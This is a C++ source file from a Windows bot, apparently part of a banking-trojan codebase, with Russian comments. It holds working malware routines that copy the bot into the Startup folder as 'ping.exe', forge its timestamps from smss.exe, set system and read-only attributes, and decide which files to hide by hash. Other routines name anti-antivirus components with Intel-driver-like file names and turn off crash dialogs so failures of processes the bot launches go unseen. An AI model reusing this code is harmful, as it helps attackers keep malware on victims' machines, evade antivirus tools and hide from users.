
#include <windows.h>
#include <shlobj.h>

#include "BotCore.h"



//igfxtray.exe
//igfxtray.dat

WCHAR BOT_FILE_NAME[] = {'\\','p','i','n','g','.','e','x','e',0};

//igxpdv32.dat
//igxpgd32.dat

WCHAR BOT_STOPAV_NAME[] = {'\\','i','g','x','p','d','v','3','2','.','d','a','t', 0};
WCHAR BOT_MINIAV_NAME[] = {'\\','i','g','x','p','g','d','3','2','.','d','a','t', 0};

//DWORD BOT_FILE_HASH = 0xED3D8E99;
//DWORD BOT_CFGN_HASH	= 0xED3DC208;
DWORD BOT_STAV_HASH = 0x551DD093;
DWORD BOT_MNAV_HASH = 0x551B9893;


//DWORD GetBotHash()
//{
//	return BOT_FILE_HASH;
//}


//DWORD GetCfgHash()
//{
//	return BOT_CFGN_HASH;
//}

WCHAR *GetShellFoldersKey( DWORD dwParam )
{
	int dwTemp = 0;

	if ( dwParam == 1 )
	{
		dwTemp = CSIDL_STARTUP;
	}
	else if ( dwParam == 2 )
	{
		dwTemp = CSIDL_APPDATA;
	}

	WCHAR *UserPath = (WCHAR*)MemAlloc( MAX_PATH * sizeof(WCHAR) );

	if ( UserPath == NULL )
	{
		return NULL;
	}

	pSHGetSpecialFolderPathW((HWND)NULL, UserPath, dwTemp, true);

	return UserPath;
}



void SetFakeFileDateTime(PCHAR Path)
{
	WCHAR smss[] = {'\\','s','m','s','s','.','e','x','e',0};

	// Получаем дату и время системмного файла
	WCHAR *SysPath = (WCHAR *)MemAlloc( 512 );

	if (SysPath == NULL)
		return;

	pGetSystemDirectoryW(SysPath, 512);
	plstrcatW( SysPath, smss );

	HANDLE hFile = pCreateFileW( SysPath,  GENERIC_READ,  FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0 );

	MemFree( SysPath );
	
	if ( hFile == INVALID_HANDLE_VALUE )
	{
		return;
	}

	FILETIME fl1;
	FILETIME fl2;
	FILETIME fl3;

	pGetFileTime( hFile, &fl1, &fl2, &fl3 );
	pCloseHandle( hFile );

	// Устанавливаем дату бота
	hFile = pCreateFileA(Path,  GENERIC_WRITE,  FILE_SHARE_WRITE, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0 );

	if ( hFile == INVALID_HANDLE_VALUE )
	{
		return;
	}

	pSetFileTime( hFile, &fl1, &fl2, &fl3 );
	pCloseHandle( hFile );

	return;
}

void SetFakeFileDateTimeW(PWCHAR Path)
{
	PCHAR FileName = WSTR::ToAnsi(Path, 0);
    SetFakeFileDateTime(FileName);
	STR::Free(FileName);
}

//WCHAR BotFile[ 256 ];
//
//WCHAR *GetBotPath()
//{
//	if ( !m_wcslen( BotFile ) )
//	{
//		WCHAR *BotPath = GetShellFoldersKey(1);
//
//		if ( BotPath == NULL )
//		{
//			return NULL;
//		}
//
//		plstrcatW( BotPath, BOT_FILE_NAME );
//		plstrcpyW( BotFile, BotPath );
//
//		MemFree( BotPath );
//	}
//
//	WCHAR *Ret = BotFile;
//
//	return Ret;
//}


void AddToAutoRun( WCHAR *TempFileName )
{	
	if ( pGetFileAttributesW( TempFileName ) != 0 )
	{
		WCHAR *BotPath = GetShellFoldersKey( 1 );
		if ( BotPath == NULL )
		{
			return;
		}

		plstrcatW( BotPath, BOT_FILE_NAME );

		pSetFileAttributesW( BotPath, FILE_ATTRIBUTE_NORMAL );

		pCopyFileW( TempFileName, BotPath, FALSE );

		SetFakeFileDateTimeW( BotPath );

		pSetFileAttributesW( BotPath, FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY );
	
		pDeleteFileW( TempFileName );

		MemFree( BotPath );
	}

	return;
}

void AddToAutoRun(void *body, DWORD size)
{	
	WCHAR *BotPath = GetShellFoldersKey( 1 );
	if ( BotPath == NULL )
	{
		return;
	}

	plstrcatW( BotPath, BOT_FILE_NAME );
	pSetFileAttributesW( BotPath, FILE_ATTRIBUTE_NORMAL );

	HANDLE f = pCreateFileW(BotPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
	DWORD  written = 0;
	if (f != INVALID_HANDLE_VALUE)
	{
		pWriteFile(f, body, size, &written, NULL);
		pCloseHandle(f);
	}

	if (written == size)
	{
		SetFakeFileDateTimeW( BotPath );
		pSetFileAttributesW( BotPath, FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY );
	}

	MemFree( BotPath );
}





WCHAR MiniAVPath[ MAX_PATH ] = {0};

WCHAR *GetMiniAVPath()
{
    PWCHAR Ret = MiniAVPath;

	if (*Ret == 0)
	{
		WCHAR *AppPath = GetShellFoldersKey( 2 );

		if ( AppPath  )
		{
			plstrcpyW( MiniAVPath, AppPath		   );
			plstrcatW( MiniAVPath, BOT_MINIAV_NAME );



			MemFree( AppPath );
		}
	}

	return Ret;
}

WCHAR StopAVPath[ MAX_PATH ];

WCHAR *GetStopAVPath()
{

	PWCHAR Ret = StopAVPath;
	if (*Ret == 0)
	{
		WCHAR *AppPath = GetShellFoldersKey( 2 );

		WCHAR *Ret = NULL;

		if (AppPath)
		{
			plstrcpyW( StopAVPath, AppPath		   );
			plstrcatW( StopAVPath, BOT_STOPAV_NAME );

			MemFree( AppPath );
		}
	}

	return Ret;
}



WCHAR *GetTempName()
{
	WCHAR *TempPath = (WCHAR*)MemAlloc( 512 );
	WCHAR *FileName = (WCHAR*)MemAlloc( 512 );

	if ( !TempPath || !FileName )
	{
		return NULL;
	}

	pGetTempPathW( 512, TempPath );
	pGetTempFileNameW( TempPath, L"", 0, FileName );

	MemFree( TempPath );

	return FileName;
}

//----------------------------------------------------------------------------

//BOOL IsHide( DWORD dwFileHash )
//{
//	if ( dwFileHash == BOT::GetBotExeNameHash() ||
//	     dwFileHash == BOT::GetWorkFolderHash() ||
//		 dwFileHash == BOT_CFGN_HASH ||
//		 dwFileHash == BOT_STAV_HASH ||
//		 dwFileHash == BOT_MNAV_HASH ||
//		 dwFileHash == BANKING_SIGNAL_FILE_HASH
//		 )
//	{
//		return TRUE;
//	}
//
//	return FALSE;
//}

//----------------------------------------------------------------------------

BOOL IsHideFile(PWCHAR FileName, ULONG FileNameLen, int ControlPoint)
{
	//  Функция возвращает истину, если необходимо спрятать
	//  указанный файл
	//
	// ControlPoint - Информация для отладки

	int Len = FileNameLen / sizeof(WCHAR); // функции передаётся размер буфера а не длина строки

	if (FileName == NULL || FileNameLen == 0)
		return FALSE;

	// Определяем хэш файла
	DWORD Hash = STRW::Hash(FileName, Len, false);

//	wstring Str;
//	Str.Format(L"1---%d----- %s", ControlPoint, FileName);
//	pOutputDebugStringW(Str.t_str());

	// Проверяем хэш
	BOOL Hide = BOT::IsHiddenFile(Hash);

	return Hide;
}
//----------------------------------------------------------------------------

void CopyFileToTemp( WCHAR *Path, WCHAR *Temp )
{
	if ( !Path || !Temp )
	{
		return;
	}

	WCHAR *TempPath = GetTempName();

	if ( TempPath == NULL )
	{
		return;
	}

	pCopyFileW( Path, TempPath, FALSE );

	plstrcpyW(Temp, TempPath);

	MemFree( TempPath );

	return;
}


//----------------------------------------------------------------------------
void DisableShowFatalErrorDialog()
{
	// функция устанавливает режим отображения
	// ошибок при котором система не будет отображать сообщение о крахе
	// процесса. Тем самым мы скроем крах запущенных ботом процессов

	pSetErrorMode(SEM_FAILCRITICALERRORS |
				  SEM_NOALIGNMENTFAULTEXCEPT |
				  SEM_NOGPFAULTERRORBOX |
				  SEM_NOOPENFILEERRORBOX);
}



